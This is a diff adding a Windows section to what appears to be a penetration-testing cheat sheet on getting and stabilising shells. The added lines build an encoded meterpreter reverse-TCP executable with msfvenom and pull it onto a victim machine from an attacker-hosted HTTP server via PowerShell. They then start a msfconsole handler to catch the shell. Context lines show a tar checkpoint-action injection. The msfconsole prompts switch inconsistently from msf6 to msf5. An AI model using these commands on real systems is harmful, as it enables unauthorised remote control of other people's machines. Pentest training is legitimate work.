@@ -88,6 +88,8 @@ echo > '--checkpoint-action=exec=sh shell.sh'
 
 ## How to stabilise a shell:
 
+### Linux
+
 ```shell
 python3 -c "import pty; pty.spawn('/bin/bash')"
 export TERM=xterm
@@ -100,6 +102,42 @@ stty raw -echo; fg
 #if you are on a meterpreter
 SHELL=/bin/bash script -q /dev/null
 ```
+
+### Windows
+
+- First generate a shell with `msfvenom`:
+
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP_ATTACK LPORT=PORT -f exe -o revshell.exe
+```
+
+- Now download the payload from the victim's machine:
+
+```shell
+python3 -m http.server # on your machine
+
+# do this on the existing netcat unstable shell
+powershell -c "Invoke-WebRequest -Uri 'http://IP_ATTACK:PORT/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'" 
+```
+
+- Now, open `msfconsole`:
+
+```shell
+msfconsole -q
+
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <YOUR_IP>
+LHOST => <YOUR_IP>
+msf5 exploit(multi/handler) > set LPORT <YOUR_PORT>
+LPORT => <YOUR_PORT>
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on <YOUR_IP>:<YOUR_PORT>
+```
+
+	
 
 ---
 
